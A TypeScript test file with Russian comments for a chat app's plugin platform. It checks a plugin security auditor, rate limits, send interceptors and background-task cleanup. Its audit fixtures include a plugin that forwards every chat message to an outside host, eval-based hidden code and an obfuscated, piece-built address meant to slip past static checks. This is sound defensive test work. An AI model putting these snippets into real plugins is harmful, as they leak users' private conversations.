    const must = ['X-Ponoi-Signature', 'INTERACTION_CREATE', 'MESSAGE_CREATE', 'bot-api', 'content', 'https']
    const missing = must.filter(m => !BOT_SPEC.includes(m))
    if (missing.length) throw new Error('не сказано про: ' + missing.join(', '))
    return true
  })

  check('инструкция про ботов не выдаёт их за плагины', () => {
    // Разные вещи с разными правилами: спутать их — верный способ получить код,
    // который никуда не встанет.
    return BOT_SPEC.includes('.ponoi') === false && BOT_SPEC.includes('onLoad') === false
  })

  check('просьба к ИИ про бота устроена так же', () =>
    /НЕ пиши код/.test(AI_BOT_PROMPT_PREFIX) && AI_BOT_PROMPT_PREFIX.includes('X-Ponoi-Signature'))

  // -- v1.445.0: отметка безопасности в каталоге ------------------------------
  // В каталоге все плагины выглядели одинаково, и отличить честный от того, что
  // читает переписку и шлёт её на сторону, можно было только прочитав код.
  console.log('\n-- Отметка безопасности --')

  const шапка = (perms: string, hosts: string[] = []) =>
    ({ permissions: perms.split(',').map(x => x.trim()).filter(Boolean) as any, hosts })

  check('чистый плагин замечаний не собирает', () => {
    const код = `function onLoad(ponoi){ ponoi.commands.register('x','y',()=>ponoi.notify('!')) }`
    const r = auditPlugin(код, шапка('commands, notify'))
    return r.level === 'clean' && r.findings.length === 0
  })

  check('переписка плюс интернет — это опасно и так и называется', () => {
    const код = `function onLoad(ponoi){ ponoi.on('message', m => ponoi.net.fetch('https://a.ru', {method:'POST', body:m.content})) }`
    const r = auditPlugin(код, шапка('messages.read, net', ['a.ru']))
    return r.level === 'unsafe' && r.findings.some(f => f.code === 'read-and-net')
  })

  check('спрятанный код — тоже опасно', () => {
    const r1 = auditPlugin('function onLoad(){ eval("1+1") }', шапка(''))
    const r2 = auditPlugin('function onLoad(){ new Function("return 1")() }', шапка(''))
    return r1.level === 'unsafe' && r2.level === 'unsafe'
      && r1.findings.some(f => f.code === 'hidden')
  })

  check('длинная строка из escape-последовательностей считается спрятанным кодом', () => {
    const длинная = '\\x41'.repeat(50)
    return hiddenCode('var s = "' + длинная + '"').includes('escape-строки')
  })

  check('обычный код за спрятанный не принимается', () => {
    // Иначе отметка «небезопасный» повисла бы на половине каталога и её
    // перестали бы читать.
    const код = `function onLoad(ponoi){ const s = "привет"; ponoi.notify(s) }`
    return hiddenCode(код).length === 0
  })

  check('адрес не из @hosts виден в замечаниях', () => {
    const код = `function onLoad(ponoi){ ponoi.net.fetch('https://tajno.ru/x') }`
    const r = auditPlugin(код, шапка('net', ['dobro.ru']))
    return r.findings.some(f => f.code === 'undeclared-host' && f.text.includes('tajno.ru'))
  })

  check('объявленный адрес замечанием не считается', () => {
    const код = `function onLoad(ponoi){ ponoi.net.fetch('https://www.dobro.ru/x') }`
    const r = auditPlugin(код, шапка('net', ['dobro.ru']))
    return !r.findings.some(f => f.code === 'undeclared-host')
  })

  check('адреса из комментариев и примеров не считаются', () => {
    const код = `/** @hosts a.ru */\n// см. https://example.com/doc\nfunction onLoad(ponoi){ ponoi.net.fetch('https://a.ru') }`
    const r = auditPlugin(код, шапка('net', ['a.ru']))
    return !r.findings.some(f => f.code === 'undeclared-host')
  })

  check('поход в сеть без разрешения назван прямо', () => {
    const код = `function onLoad(ponoi){ ponoi.net.fetch('https://a.ru') }`
    const r = auditPlugin(код, шапка('notify'))
    return r.findings.some(f => f.code === 'net-without-perm')
  })

  check('лишнее разрешение видно', () => {
    const код = `function onLoad(ponoi){ ponoi.notify('!') }`
    const r = auditPlugin(код, шапка('notify, storage'))
    return r.findings.some(f => f.code === 'unused-perms' && f.text.includes('storage'))
  })

  check('разрешение, упомянутое только в шапке, лишним и остаётся', () => {
    // Шапка сама перечисляет все разрешения — если её не выкинуть, «лишних» не
    // нашлось бы никогда.
    const код = `/** @permissions storage */\nfunction onLoad(ponoi){ ponoi.notify('!') }`
    return auditPlugin(код, шапка('notify, storage')).findings.some(f => f.code === 'unused-perms')
  })

  check('разбор узнаёт каждое разрешение', () => {
    // Появится новое, за которым в коде не видно следа, — каталог начнёт ругать
    // за него все плагины подряд, и отметка обесценится.
    const слепые = AUDITED_PERMISSIONS.filter(p => {
      // Код, который это разрешение честно использует, не должен считаться
      // «просит больше, чем делает».
      const прим: Record<string, string> = {
        'ui': 'ponoi.ui.addComposerButton()', 'css': 'ponoi.css("")',
        'commands': 'ponoi.commands.register()', 'messages.read': "ponoi.on('message',()=>{})",
        'messages.write': 'ponoi.messages.send()', 'storage': 'ponoi.storage.get()',
        'net': 'ponoi.net.fetch()', 'settings': 'ponoi.ui.addSettingsPage()',
        'notify': 'ponoi.notify()', 'voice': 'ponoi.voice.list()',
        'context': 'ponoi.me()', 'panel': 'ponoi.ui.addPanel()',
        'music': 'ponoi.music.state()', 'navigate': 'ponoi.open()', 'status': 'ponoi.status.set()',
        // v1.465.0
        'ipc': "ponoi.plugins.send('a','b',{})",
        'messages.intercept': 'ponoi.messages.onBeforeSend(async()=>{})',
        'background': 'ponoi.background.every(60000,async()=>{})',
        'ui.theme': "ponoi.ui.setTheme({accent:'#ff4500'})",
      }
      const код = прим[p]
      if (!код) return true
      return unusedPerms('function onLoad(ponoi){ ' + код + ' }', [p]).length > 0
    })
    if (слепые.length) throw new Error('разбор не видит: ' + слепые.join(', '))
    return true
  })

  check('подпись для каталога называет вещи своими именами', () => {
    const плохо = auditBadge({ level: 'unsafe', findings: [] }, true)
    const так = auditBadge({ level: 'warn', findings: [] }, false)
    const свой = auditBadge({ level: 'clean', findings: [] }, true)
    const чужой = auditBadge({ level: 'clean', findings: [] }, false)
    // Официальность НЕ отменяет разбора: опасный официальный остаётся опасным.
    return плохо.text === 'Небезопасный' && плохо.kind === 'bad'
      && так.text === 'Есть замечания' && свой.text === 'От создателей'
      && чужой.text === 'Не проверен'
  })

  check('приложение не обещает, что отметка — это гарантия', () =>
    /не проверка человеком/.test(AUDIT_NOTE) && /песочниц/.test(AUDIT_NOTE))

  check('официальные плагины разбор проходят', () => {
    // Они идут в самой сборке и ставятся всем: если хоть один собирает
    // замечание, это наш плагин просит лишнего, а не разбор придирается.
    const плохие = OFFICIAL_PLUGINS
      .map(p => ({ id: parsePlugin(p.code).id, r: auditPlugin(p.code, parsePlugin(p.code)) }))
      .filter(x => x.r.level !== 'clean')
    if (плохие.length) throw new Error(плохие.map(x => x.id + ': ' + x.r.findings.map(f => f.text).join('; ')).join(' / '))
    return true
  })

  console.log('\n-- Ломаем нарочно (отметка) --')
  check('разбор заметил бы плагин, который прячет свой адрес', () => {
    const код = `function onLoad(ponoi){ const a = 'https://' + 'zlo' + '.ru'; ponoi.net.fetch(a) }`
    // Собранный по кускам адрес разбор НЕ увидит — и это честно названо
    // в самом файле: статический разбор обойти можно. Но такой код почти всегда
    // тянет за собой и другие признаки, и хотя бы один из них должен сработать.
    const r = auditPlugin(код + ' eval("x")', шапка('net', []))
    return r.level === 'unsafe'
  })
  check('разбор заметил бы пропажу проверки «переписка + сеть»', () => {
    const r = auditPlugin('function onLoad(ponoi){ ponoi.on("message",()=>ponoi.net.fetch("https://a.ru")) }',
      шапка('messages.read, net', ['a.ru']))
    return r.findings.filter(f => f.level === 'danger').length === 1
  })

  // -- v1.447.0: метод есть у приложения — есть ли он у плагина ---------------
  // Настоящая поломка, найденная разбором: net.stream добавили в диспетчер, в
  // правила, в документацию и в штурм — и не добавили в сам объект ponoi. То
  // есть плагин звал бы метод, которого у него нет, а все проверки при этом
  // оставались зелёными. «Настройка есть» не значит «работает».
  console.log('\n-- Плагину доступно то, что умеет приложение --')
  check('каждый метод диспетчера доступен из песочницы', () => {
    const зовётся = new Set([...BOOTSTRAP_SRC.matchAll(/call\('([a-zA-Z.]+)'/g)].map(m => m[1]))
    const ветви = [...new Set([...DISPATCHER_SRC.matchAll(/case '([a-zA-Z.]+)':/g)].map(m => m[1]))]
      .filter(m => !ROW_TYPES.includes(m))
    const нет = ветви.filter(m => !зовётся.has(m))
    if (нет.length) throw new Error('приложение умеет, плагин позвать не может: ' + нет.join(', '))
    return true
  })
  check('песочница не зовёт того, чего приложение не умеет', () => {
    const ветви = new Set([...DISPATCHER_SRC.matchAll(/case '([a-zA-Z.]+)':/g)].map(m => m[1]))
    const зовётся = [...new Set([...BOOTSTRAP_SRC.matchAll(/call\('([a-zA-Z.]+)'/g)].map(m => m[1]))]
    const лишние = зовётся.filter(m => !ветви.has(m))
    if (лишние.length) throw new Error('плагин зовёт несуществующее: ' + лишние.join(', '))
    return true
  })

  // -- v1.446.0: пределы одной таблицей ---------------------------------------
  // Пределы подняты почти до свободы, но не убраны: зациклившийся плагин иначе
  // подвесил бы приложение, и до кнопки «выключить» человек бы не добрался.
  // Самое опасное здесь — опечатка в названии предела: rateLimit молча
  // пропускает неизвестный вид, то есть ограничение исчезает целиком и
  // незаметно. Эта проверка ровно про это.
  console.log('\n-- Пределы плагинов --')

  check('у каждого предела в коде есть строка в таблице', () => {
    const used = [...DISPATCHER_SRC.matchAll(/rateLimit\(id, '([a-z.]+)'\)/g)].map(m => m[1])
    if (used.length < 10) throw new Error('пределов в коде подозрительно мало: ' + used.length)
    const нет = [...new Set(used)].filter(k => !(k in LIMITS))
    if (нет.length) throw new Error('нет в таблице (предел ИСЧЕЗ): ' + нет.join(', '))
    return true
  })

  check('в таблице нет пределов, которых никто не зовёт', () => {
    // Мёртвая строка в таблице — это ложное обещание: выглядит как ограничение,
    // а не ограничивает ничего.
    const used = new Set([...DISPATCHER_SRC.matchAll(/rateLimit\(id, '([a-z.]+)'\)/g)].map(m => m[1]))
    const лишние = Object.keys(LIMITS).filter(k => !used.has(k))
    if (лишние.length) throw new Error('в таблице есть, в коде не зовётся: ' + лишние.join(', '))
    return true
  })

  check('ни один предел не выключен в ноль', () =>
    Object.values(LIMITS).every(l => l.times > 0 && l.windowMs > 0))

  check('у каждого предела есть человеческое название', () =>
    Object.values(LIMITS).every(l => typeof l.what === 'string' && l.what.length > 3))

  check('пределы правда подняты, а не остались прежними', () => {
    // Смысл выпуска: было 5 сообщений за 10 с и 5 потоков в минуту.
    return LIMITS.send.times >= 100 && LIMITS.netstream.times >= 100
      && LIMITS.net.times >= 400 && MAX_RECENT >= 400
  })

  check('приложение предупреждает о снятых пределах', () =>
    LIMITS_WARNING.length > 80 && /от твоего имени/.test(LIMITS_WARNING)
    && LIMITS_WARNING_SHORT.length > 20)

  check('числа в тексте пределов не написаны руками', () => {
    // Сообщение об отказе собирается из самой таблицы: иначе оно однажды
    // назовёт число, которого больше нет.
    return /\$\{l\.times\}/.test(DISPATCHER_SRC) && /\$\{l\.what\}/.test(DISPATCHER_SRC)
  })

  check('инструкция называет сегодняшние пределы, а не вчерашние', () => {
    // Худший вид расхождения: ИИ читает инструкцию и пишет плагин под предел,
    // которого уже нет. Поймано разбором в v1.446.0 — числа подняли, а в
    // инструкции они остались старыми сразу в восьми местах.
    const должно = [
      String(LIMITS.send.times), String(LIMITS.net.times), String(LIMITS.notify.times),
      String(LIMITS.music.times), String(MAX_PER_PLUGIN.commands), String(MAX_RECENT),
    ]
    const нет = должно.filter(n => !PLUGIN_SPEC.includes(n))
    if (нет.length) throw new Error('в инструкции нет чисел: ' + нет.join(', '))
    const старое = /не чаще 5 сообщений|не чаще 20 запросов|не больше 1 МБ|не больше 64 КБ|команд — 15/
    if (старое.test(PLUGIN_SPEC)) throw new Error('в инструкции остался старый предел')
    return true
  })

  console.log('\n-- Ломаем нарочно (пределы) --')
  check('проверка заметила бы предел с опечаткой в названии', () => {
    // Опечатка означает не «строгий предел», а ОТСУТСТВИЕ предела.
    const выдумка = 'sennd'
    return !(выдумка in LIMITS)
  })

  // ── v1.465.0: семь новых возможностей ──────────────────────────────────
  //
  // Штурм (npm run test:attack) проверяет, что плохое не проходит. Здесь —
  // что ХОРОШЕЕ работает и работает предсказуемо: цепочка перехватчиков в
  // объявленном порядке, догон фоновых задач, полнота уборки.
  console.log('\n-- Новые возможности плагинов (v1.465.0) --')

  {
    const mw = await import('./middleware')
    const fake = (n: string) => ({ __fn: n }) as any

    // Порядок важен по-настоящему: шифрующий и переводящий плагины дадут разный
    // результат при разном порядке, и он не должен зависеть от случая.
    const порядок: string[] = []
    mw.clearAllInterceptors()
    mw.addInterceptor({ pluginId: 'первый', kind: 'send', fn: fake('a') })
    mw.addInterceptor({ pluginId: 'второй', kind: 'send', fn: fake('b') })
    const цепочка = await mw.runBeforeSend('текст', 'ch1', async (pid, _fn, args) => {
      порядок.push(pid)
      return (args[0] as { content: string }).content + '+' + pid
    })
    mw.clearAllInterceptors()
    check('цепочка перехватчиков идёт в порядке объявления', () =>
      порядок.join(',') === 'первый,второй' && цепочка.content === 'текст+первый+второй')

    mw.clearAllInterceptors()
    mw.addInterceptor({ pluginId: 'первый', kind: 'send', fn: fake('a') })
    mw.addInterceptor({ pluginId: 'второй', kind: 'send', fn: fake('b') })
    const отмена = await mw.runBeforeSend('текст', null, async (pid) =>
      pid === 'первый' ? { cancel: true } : 'не должно случиться')
    mw.clearAllInterceptors()
    check('отмена называет виновника и обрывает цепочку', () =>
      отмена.cancel && отмена.by === 'первый')

    mw.clearAllInterceptors()
    check('пока перехватчиков нет, путь отправки прежний', () =>
      mw.hasInterceptors('send') === false && mw.hasInterceptors('render') === false)

    check('пустой текст после правки — это отмена, а не прежний текст', () =>
      mw.applySendResult('было', '   ').cancel === true)

    check('больше предела перехватчиков одного вида не поставить', () => {
      mw.clearAllInterceptors()
      for (let i = 0; i < mw.MAX_INTERCEPTORS; i++) {
        mw.addInterceptor({ pluginId: 'жадный', kind: 'send', fn: fake('f' + i) })
      }
      try { mw.addInterceptor({ pluginId: 'жадный', kind: 'send', fn: fake('лишний') }); return false }
      catch { return true }
      finally { mw.clearAllInterceptors() }
    })
  }

  {
    const bg = await import('./background')
    bg.clearAllTasks()
    check('задача не срабатывает раньше своего срока', () => {
      const сейчас = 1_000_000
      const t = { id: 7, pluginId: 'x', everyMs: 5000, dueAt: сейчас + 1, runs: 0, label: 'з' }
      return bg.dueNow([t], сейчас).run.length === 0
    })
    check('несколько задач с разными сроками считаются каждая по-своему', () => {
      const сейчас = 1_000_000
      const a = { id: 1, pluginId: 'x', everyMs: 1000, dueAt: сейчас - 10, runs: 0, label: 'a' }
      const b = { id: 2, pluginId: 'x', everyMs: 9000, dueAt: сейчас + 5000, runs: 0, label: 'b' }
      const r = bg.dueNow([a, b], сейчас)
      return r.run.length === 1 && r.run[0].id === 1 && r.next.get(1) === сейчас + 1000
    })
    check('человек может остановить задачу, не спрашивая плагин', () => {
      bg.clearAllTasks()
      const t = bg.addTask('чей-то', 60000, 'моя')
      const ok1 = bg.stopTaskByUser(t.id)
      const ok2 = bg.stopTaskByUser(t.id)   // второй раз останавливать нечего
      return ok1 === true && ok2 === false
    })
  }

  {
    const { THEME_VARS, THEME_VAR_NAMES, parseTheme, themeCss } = await import('./pluginTheme')
    check('каждое имя цвета ведёт к настоящей переменной приложения', () => {
      // Опечатка здесь = «цвет применился, ничего не изменилось».
      const стили = readFileSync('src/lib/settings.tsx', 'utf8')
      const нет = Object.values(THEME_VARS).filter(v => !стили.includes(`'${v}'`))
      if (нет.length) throw new Error('приложение не знает таких переменных: ' + нет.join(', '))
      return THEME_VAR_NAMES.length >= 7
    })
    check('ведущие дефисы в имени цвета прощаются', () =>
      JSON.stringify(parseTheme({ '--accent': '#ff4500' })) === JSON.stringify(parseTheme({ accent: '#ff4500' })))
    check('цвета плагина сильнее собственных настроек приложения', () => {
      // Приложение пишет эти переменные прямо в стиль корня при каждой смене
      // темы. Без !important первая же смена стирала бы цвета плагина, и
      // выглядело бы это как «настройка есть, а не работает».
      const css = themeCss('p', { accent: '#ff4500' })
      return css.includes('!important') && css.includes(':root')
    })
  }

  {
    const cleanup = await import('./cleanup')
    check('уборка знает про каждую подсистему, которая умеет убирать за всеми', () => {
      // Настоящая защита от «добавили шестую и забыли»: ищем во ВСЕХ файлах
      // плагинов функции вида clearAll…/closeAll…, и каждая обязана быть
      // позвана из cleanup.ts. Иначе выключенный плагин продолжит работать.
      const { readdirSync } = require('node:fs') as typeof import('node:fs')
      const дир = 'src/lib/plugins'
      const свод = readFileSync(дир + '/cleanup.ts', 'utf8')
      const забытые: string[] = []
      for (const f of readdirSync(дир)) {
        if (!f.endsWith('.ts') || f.startsWith('__') || f === 'cleanup.ts') continue
        const src = readFileSync(дир + '/' + f, 'utf8')
        for (const m of src.matchAll(/export function ((?:clearAll|closeAll)\w*)/g)) {
          if (!свод.includes(m[1])) забытые.push(f + ':' + m[1])
        }
      }
      if (забытые.length) throw new Error('не позвано из cleanup.ts: ' + забытые.join(', '))
      return cleanup.SUBSYSTEM_COUNT > 0
    })
  }

  check('перехватчик стоит на КАЖДОМ пути, которым текст уходит на сервер', () => {
    // Дыра, найденная разбором выпуска v1.465.0: onBeforeSend ловил отправку, но
    // не правку уже отправленного сообщения. Для шифрующего плагина это утечка —
    // человек поправил сообщение, и на сервер ушёл открытый текст.
    //
    // Экранов с правкой три, и завтра может стать четыре. Поэтому проверка не
    // перечисляет их поимённо, а ищет ВСЕ реализации editMsg и требует от каждой
    // вызова перехватчика.
    const { readdirSync } = require('node:fs') as typeof import('node:fs')
    const дир = 'src/components'
    const без: string[] = []
    let нашли = 0
    for (const f of readdirSync(дир)) {
      if (!f.endsWith('.tsx')) continue
      const src = readFileSync(дир + '/' + f, 'utf8')
      const i = src.indexOf('async function editMsg(')
      if (i < 0) continue
      нашли++
      // Тело функции — до следующего объявления на том же уровне.
      const тело = src.slice(i, i + 1200)
      if (!тело.includes('runBeforeSend')) без.push(f)
    }
    if (нашли < 3) throw new Error('путей правки нашлось подозрительно мало: ' + нашли)
    if (без.length) throw new Error('правка идёт мимо перехватчика: ' + без.join(', '))
    return true
  })

  check('перехват правки стоит ДО показа, а не после', () => {
    // Иначе на экране осталось бы одно, а на сервере оказалось другое — та самая
    // расходящаяся пара «показ и действие», из-за которой в этом проекте ломается
    // чаще всего.
    const src = readFileSync('src/components/ServerView.tsx', 'utf8')
    const i = src.indexOf('async function editMsg(')
    const тело = src.slice(i, i + 1200)
    const перехват = тело.indexOf('runBeforeSend')
    const показ = тело.indexOf('setMessages')
    return перехват > 0 && показ > 0 && перехват < показ
  })

  console.log('\n-- Ломаем нарочно (новые возможности) --')
  {
    const mw = await import('./middleware')
    // Так выглядела бы ошибка: считать любой ложный ответ отменой. Тогда
    // обработчик, забывший вернуть значение, отменял бы каждое сообщение.
    const плохо = (r: unknown) => !r
    const хорошо = mw.applySendResult('текст', undefined).cancel
    check('«вернул ничего» не должно означать отмену', () => плохо(undefined) === true && хорошо === false)
  }
  {
    const { checkTarget } = await import('./netGuard')
    const цель = { hosts: ['a.example'], selfHost: 'ponoi.app', supaHost: '' }
    check('проверка заметила бы, что схему перестали смотреть', () =>
      // Если бы схема не проверялась, wss-адрес прошёл бы обычной проверкой https.
      checkTarget('wss://a.example/x', цель) !== null)
  }

  console.log(`\nИТОГ: пройдено ${pass}, провалено ${fail}`)
  process.exit(fail ? 1 : 0)
})()
